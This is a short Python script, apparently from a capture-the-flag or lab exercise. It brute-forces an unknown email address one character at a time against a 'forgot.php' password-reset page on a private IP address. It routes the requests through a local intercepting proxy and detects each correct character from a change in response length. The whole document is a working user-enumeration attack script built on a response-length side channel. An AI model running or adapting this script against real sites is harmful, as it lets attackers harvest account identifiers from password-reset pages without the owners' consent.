import requests

print("starting...")
_query = "http://10.102.126.68/forgot.php?email=INPUT@secure-chat.co.uk"
chars = "0123456789abcdefghijklmnopqrstuvwxyz"
current = "83kwhq"
for i in range(10):
    for char in chars:
        query = char+current
        query = _query.replace("INPUT", query)
        r = requests.get(query, proxies={"http":"http://127.0.0.1:8080"})
        if len(r.text) != 3593:
            current = char+current
            print(current)
            break
        
